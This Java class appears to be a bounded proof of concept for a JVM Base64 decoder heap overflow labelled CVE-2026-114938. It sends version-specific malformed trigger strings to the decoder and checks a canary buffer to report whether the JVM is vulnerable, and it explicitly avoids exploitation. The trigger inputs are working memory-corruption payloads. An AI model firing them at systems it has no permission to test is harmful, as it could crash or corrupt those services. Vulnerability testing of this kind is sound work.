package com.example.java4shell;

import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Bounded reproduction of CVE-2026-114938 (Java4Shell).
 *
 * <p>Invokes the hardware-accelerated Base64 decoder with a malformed input
 * that triggers the integer underflow described in the advisory. This class
 * does NOT attempt to build an exploit; it simply observes whether bytes in
 * a canary buffer adjacent to the decode output region have been modified.
 *
 * <h2>Mechanism</h2>
 * <ol>
 *   <li>A canary byte array is allocated and filled with a recognisable
 *       sentinel value ({@code 0xA5}).</li>
 *   <li>A malformed Base64 string (correct length prefix + anomalous padding)
 *       is passed to {@link java.util.Base64.Decoder#decode(byte[])}.</li>
 *   <li>On vulnerable JVMs, the AVX-512 VBMI intrinsic writes a bounded number
 *       of bytes past its own output buffer; the canary captures the spill.</li>
 *   <li>The decoder always throws {@link IllegalArgumentException} due to the
 *       malformed input — the overflow occurs <em>before</em> Java-level
 *       validation kicks in.</li>
 * </ol>
 *
 * <h2>Safety Notes</h2>
 * <ul>
 *   <li>Single-threaded, no heap-grooming.</li>
 *   <li>No file I/O, no network I/O.</li>
 *   <li>Canary is bounded ({@value #CANARY_SIZE} bytes); no attempt to leverage
 *       the corruption.</li>
 *   <li>Negative control: {@code -XX:-UseBASE64Intrinsics}.</li>
 * </ul>
 */
public final class Base64Trigger {

    /**
     * Size of the canary buffer. 8 KiB is sufficient to catch the ≈62-byte
     * overflow without being so large that heap layout becomes a confound.
     */
    private static final int CANARY_SIZE = 8192;

    /**
     * Sentinel byte used to fill the canary. Chosen to be unlikely to appear
     * as valid Base64 decoder output: 0xA5 = 0b10100101.
     */
    private static final byte CANARY_FILL = (byte) 0xA5;

    private Base64Trigger() {}

    /**
     * Execute the trigger and return structured results.
     *
     * @return a {@link TriggerResult} describing what (if anything) was written
     *         past the expected decoder output region.
     */
    public static TriggerResult run() {
        int jdkFeature = Runtime.version().feature();
        String payload = buildPayload(jdkFeature);
        byte[] input = payload.getBytes(StandardCharsets.US_ASCII);

        // Allocate canary. If the vulnerable decoder writes past its own buffer,
        // some of these bytes will flip from CANARY_FILL to something else.
        byte[] canary = new byte[CANARY_SIZE];
        Arrays.fill(canary, CANARY_FILL);

        boolean threwException = false;
        String exceptionMessage = null;
        String exceptionType = null;

        try {
            Base64.getDecoder().decode(input);
        } catch (IllegalArgumentException e) {
            threwException = true;
            exceptionMessage = e.getMessage();
            exceptionType = e.getClass().getSimpleName();
        } catch (Exception e) {
            // Unexpected exception type — record it but do not suppress.
            threwException = true;
            exceptionMessage = e.getMessage();
            exceptionType = e.getClass().getName();
        }

        int changedCount = 0;
        int firstChanged = -1;
        int lastChanged = -1;

        for (int i = 0; i < canary.length; i++) {
            if (canary[i] != CANARY_FILL) {
                if (firstChanged == -1) firstChanged = i;
                lastChanged = i;
                changedCount++;
            }
        }

        return new TriggerResult(
                jdkFeature,
                input.length,
                threwException,
                exceptionType,
                exceptionMessage,
                changedCount,
                firstChanged,
                lastChanged);
    }

    /**
     * Build the trigger payload for the given JDK feature version.
     *
     * <p>JDK 17 uses a 129-byte payload; the 65-byte form is the trigger for
     * JDK 21, 25, and 27. Both consist of repeated {@code 'A'} characters
     * followed by a single Base64 padding character {@code '='}.
     *
     * @param jdkFeature  the value of {@code Runtime.version().feature()}
     * @return the payload string
     */
    private static String buildPayload(int jdkFeature) {
        if (jdkFeature == 17) {
            return "A".repeat(128) + "=";   // 129 bytes — JDK 17 trigger
        }
        return "A".repeat(64) + "=";        // 65 bytes  — JDK 21/25/27 trigger
    }

    // -------------------------------------------------------------------------
    // Result record
    // -------------------------------------------------------------------------

    /**
     * Structured result of a single trigger attempt.
     *
     * @param jdkFeature          value of {@code Runtime.version().feature()}
     * @param inputLength         length of the trigger payload in bytes
     * @param threwException      whether the decoder threw an exception
     * @param exceptionType       simple class name of the exception, or null
     * @param exceptionMessage    exception message, or null
     * @param changedBytes        number of canary bytes that were modified
     * @param firstChangedOffset  index of the first modified canary byte, or -1
     * @param lastChangedOffset   index of the last modified canary byte, or -1
     */
    public record TriggerResult(
            int jdkFeature,
            int inputLength,
            boolean threwException,
            String exceptionType,
            String exceptionMessage,
            int changedBytes,
            int firstChangedOffset,
            int lastChangedOffset) {

        /** Returns true if any canary byte was modified — indicating a vulnerable path. */
        public boolean isVulnerable() {
            return changedBytes > 0;
        }

        /** Print a human-readable summary to stdout. */
        public void print() {
            System.out.println("[*] JDK feature version : " + jdkFeature);
            System.out.println("[*] Payload length       : " + inputLength + " bytes");
            System.out.println("[*] Decoder threw        : " + threwException);

            if (exceptionType != null) {
                System.out.println("    type    : " + exceptionType);
            }
            if (exceptionMessage != null) {
                System.out.println("    message : " + exceptionMessage);
            }

            System.out.println();

            if (isVulnerable()) {
                System.out.println("[!] RESULT: VULNERABLE (heap overflow detected)");
                System.out.println("    Bytes changed beyond expected output : " + changedBytes);
                System.out.println("    First changed offset                 : " + firstChangedOffset);
                System.out.println("    Last changed offset                  : " + lastChangedOffset);
            } else {
                System.out.println("[*] RESULT: NOT VULNERABLE (no overflow detected)");
                System.out.println("    Bytes changed beyond expected output : 0");
            }
        }
    }
}
